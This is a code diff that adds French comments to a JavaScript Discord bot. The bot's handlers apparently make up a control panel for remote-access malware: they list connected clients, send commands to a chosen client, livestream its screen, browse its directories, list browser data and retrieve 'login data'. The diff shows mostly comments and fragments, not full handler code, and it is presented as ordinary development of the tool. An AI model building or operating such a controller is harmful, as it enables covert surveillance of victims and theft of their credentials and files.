@@ -6,6 +6,7 @@ import config from "../static/config.json" assert {type: "json"};
 
 const {API_BASE_URL} = config;
 
+// Fonction pour gérer la commande /help
 export const handleHelpCommand = async (interaction) => {
     await interaction.deferReply({ephemeral: true});
     const embed = createEmbed('Aide', 'Voici la liste des commandes disponibles :', commands.map(command => ({
@@ -15,6 +16,7 @@ export const handleHelpCommand = async (interaction) => {
     await interaction.editReply({embeds: [embed]});
 };
 
+// Fonction pour gérer la commande /clients
 export const handleClientsCommand = async (interaction) => {
     await interaction.deferReply({ephemeral: true});
 
@@ -47,6 +49,7 @@ export const handleClientsCommand = async (interaction) => {
     }
 };
 
+// Fonction pour gérer la commande /command
 export const handleSendCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     const command = interaction.options.getString('command');
@@ -112,6 +115,7 @@ export const handleSendCommand = async (interaction) => {
     }
 };
 
+// Fonction pour gérer la commande /livestream
 export const handleLivestreamCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     await interaction.deferReply({ephemeral: true});
@@ -135,6 +139,7 @@ export const handleLivestreamCommand = async (interaction) => {
     }
 }
 
+// Fonction pour gérer la commande /stop_stream
 export const handleStopLivestreamCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     await interaction.deferReply({ephemeral: true});
@@ -157,6 +162,7 @@ export const handleStopLivestreamCommand = async (interaction) => {
     }
 }
 
+// Fonction pour gérer la commande /list_data
 export const handleListDataCommand = async (interaction) => {
     const type = interaction.options.getString('type');
     const browser = interaction.options.getString('browser') || null;
@@ -179,7 +185,7 @@ export const handleListDataCommand = async (interaction) => {
         );
 
         const components = [];
-        for (let i = 0; i < buttons.length; i += 5) {
+        for (let i = 0; i < buttons.length; i += 5) { // Limite de 5 boutons par ligne (Restriction Discord)
             const actionRow = new ActionRowBuilder().addComponents(buttons.slice(i, i + 5));
             components.push(actionRow);
         }
@@ -215,6 +221,7 @@ export const handleListDataCommand = async (interaction) => {
     }
 }
 
+// Fonction pour gérer la commande /list_directories_client
 export const handleListDirectoriesClientCommand = async (interaction) => {
     const clientId = interaction.options.getString('client_id');
     const dir_path = interaction.options.getString('dir_path');
@@ -239,6 +246,7 @@ export const handleListDirectoriesClientCommand = async (interaction) => {
         let currentPage = 0;
         const totalPages = Math.ceil(directories_and_files.length / itemsPerPage);
 
+        // Fonction pour générer un embed avec la liste des répertoires et fichiers du client en fonction de la page
         const generateEmbed = (page) => {
             const start = page * itemsPerPage;
             const end = start + itemsPerPage;
@@ -280,6 +288,7 @@ export const handleListDirectoriesClientCommand = async (interaction) => {
         const filter = i => ['previous', 'next'].includes(i.customId) && i.user.id === interaction.user.id;
         const collector = message.createMessageComponentCollector({filter, time: 60000});
 
+        // Création d'un collecteur pour gérer la pagination
         collector.on('collect', async i => {
             if (i.customId === 'next' && currentPage < totalPages - 1) {
                 currentPage++;
@@ -321,6 +330,7 @@ export const handleListDirectoriesClientCommand = async (interaction) => {
     }
 };
 
+// Fonction pour gérer la commande /get_login_data
 export async function handleGetLoginDataCommand(interaction) {
     await interaction.deferReply({ephemeral: true});
 
